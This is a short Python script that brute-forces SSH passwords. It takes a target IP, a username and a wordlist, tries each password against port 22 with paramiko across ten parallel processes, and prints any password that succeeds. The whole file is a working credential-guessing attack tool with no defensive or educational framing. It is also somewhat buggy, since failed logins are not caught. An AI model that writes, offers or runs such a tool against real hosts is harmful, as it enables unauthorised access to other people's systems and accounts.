import os,socket,sys,paramiko
import multiprocessing
from itertools import product
import time
ip = input("Input IP address>: ")
username = input("Input username>: ")
pwFile = input("Password directory>: ")
passcode = []
def fileOpening(pwFile):
    try:
        with open(pwFile,"r") as pwfile:
            for pw in pwfile.readlines():
                password = pw.strip()
                passcode.append(password)

            global start
            start = time.time()
            with multiprocessing.Pool(processes=10) as pool:
                pool.starmap(connection,product(passcode))

    except ValueError as err:
        print(err)

def connection(password,code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip,port=22,username=username,password=password)
    print("Password found at",password)
    end = time.time()
    print("Taking Time is ",end-start,"\n")
    exit(1)
    ssh.close()
if __name__ == "__main__":
    fileOpening(pwFile)
